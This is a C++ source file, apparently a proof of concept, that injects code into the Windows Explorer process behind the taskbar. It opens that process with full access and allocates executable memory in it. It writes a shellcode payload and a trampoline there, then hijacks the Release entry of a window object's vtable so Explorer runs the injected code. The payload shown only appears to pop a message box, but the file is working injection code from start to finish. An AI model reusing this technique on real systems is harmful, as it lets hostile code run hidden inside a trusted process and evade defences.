#include <Stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <vector>
#pragma comment(lib, "user32")

LPCTSTR pid2name(DWORD dwPid)
{
    static char procName[261];
    HANDLE hSnapshot;
    PROCESSENTRY32 entry;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(hSnapshot, &entry))
    {
        do
        {
            if (entry.th32ProcessID == dwPid)
            {
                lstrcpy(procName, entry.szExeFile);
                return procName;
            }
        }
        while (Process32Next(hSnapshot, &entry));
    }

    return "(none)";
}

HWND g_hwndMSTaskListWClass;

BOOL WINAPI EnumProc(HWND hWnd, LPARAM lP)
{
    static char szClass[128];
    GetWindowText(hWnd, szClass, 127);
    if (!lstrcmp(szClass, "Running applications"))
    {
        g_hwndMSTaskListWClass = hWnd;
    }
    return TRUE;
}

typedef struct {
    UINT64 pfnAddRef;
    UINT64 pfnRelease;
    UINT64 pfnWndProc;
} CImpWndProc;

int main()
{
    HWND hw = NULL, hwMSTaskListWClass;
    DWORD dwPid;
    SIZE_T nRead;

    // EnumWindows(EnumProc, NULL);

    HWND hwShellTray = FindWindowEx(NULL, NULL, "Shell_TrayWnd", NULL);
    printf("[<] ShellTrayWnd: %p\n", hwShellTray);

    EnumChildWindows(hwShellTray, EnumProc, NULL);

    printf("[*] Running applications: %p\n", g_hwndMSTaskListWClass);
    GetWindowThreadProcessId(g_hwndMSTaskListWClass, &dwPid);
    printf("[*] Process: %s (%d)\n", pid2name(dwPid), dwPid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    printf("[*] Handle: %p\n", hProcess);

    auto m_windowPtr = GetWindowLongPtr(g_hwndMSTaskListWClass, 0);
    printf("[*] VTable Ptr Ptr: %p\n", (PVOID)m_windowPtr);

    CImpWndProc m_vTable {};
    UINT64 ptrVTable;
    ReadProcessMemory(hProcess, PVOID(m_windowPtr), &ptrVTable, sizeof ptrVTable, &nRead);
    printf("[*] VTable Ptr: %p\n", PVOID(ptrVTable));
    ReadProcessMemory(hProcess, PVOID(ptrVTable), &m_vTable, sizeof m_vTable, &nRead);
    printf("[CImpWndProc.AddRef] -> %p\n", m_vTable.pfnAddRef);
    printf("[CImpWndProc.Release] -> %p\n", m_vTable.pfnRelease);
    printf("[CImpWndProc.WndProc] -> %p\n", m_vTable.pfnWndProc);

    // change release to
    // mov rax, addr of shellcode
    // call rax
    // jmp old_release
    const char payload[] = {0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0x05, 0x58, 0x00, 0x00, 0x00, 0x48, 0xFF, 0x05, 0x51, 0x00, 0x00, 0x00, 0x48, 0x83, 0xF8, 0x03, 0x7D, 0x34, 0x33, 0xC9, 0xE8, 0x0D, 0x00, 0x00, 0x00, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x21, 0x00, 0x5A, 0xE8, 0x09, 0x00, 0x00, 0x00, 0x78, 0x30, 0x72, 0x31, 0x39, 0x78, 0x39, 0x31, 0x00, 0x41, 0x58, 0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x21, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x2C, 0x0B, 0xD3, 0xF9, 0x7F, 0x00, 0x00};
    size_t payloadSize = sizeof payload;

    auto vTableMem = (UINT64) VirtualAllocEx(hProcess, NULL, 32, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("New VTable: %p\n", vTableMem);
    auto vMem = (UINT64)VirtualAllocEx(hProcess, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, PVOID(vMem), payload, payloadSize, &nRead);

    printf("[*] Payload Addr: %#016lx\n", vMem);

    std::vector<uint8_t> shellcode;

    // mov rax, vMem
    shellcode.push_back(uint8_t(0x48));
    shellcode.push_back(uint8_t(0xb8));

    for (int i = 0; i < 8; i++)
        shellcode.push_back(uint8_t(vMem >> i*8 & 0xff));

    // call rax
    shellcode.push_back(uint8_t(0xff));
    shellcode.push_back(uint8_t(0xd0));

    // mov rax, old_release
    shellcode.push_back(uint8_t(0x48));
    shellcode.push_back(uint8_t(0xb8));

    for (int i = 0; i < 8; i++)
        shellcode.push_back(uint8_t(m_vTable.pfnRelease >> i*8 & 0xff));

    // jmp rax
    shellcode.push_back(uint8_t(0xff));
    shellcode.push_back(uint8_t(0xe0));

    printf("Press Enter To Exploit!\n");
    char sc;
    sc = getchar();

    auto shellcodeAddr = vMem + payloadSize + 15 & -16;
    m_vTable.pfnRelease = shellcodeAddr;
    printf("[*] Shellcode Addr: %#016lx\n", shellcodeAddr);
    WriteProcessMemory(hProcess, PVOID(shellcodeAddr), shellcode.data(), shellcode.size(), &nRead);
    WriteProcessMemory(hProcess, PVOID(vTableMem), &m_vTable, sizeof m_vTable, &nRead);
    WriteProcessMemory(hProcess, PVOID(m_windowPtr), &vTableMem, sizeof vTableMem, &nRead);

    CloseHandle(hProcess);
}
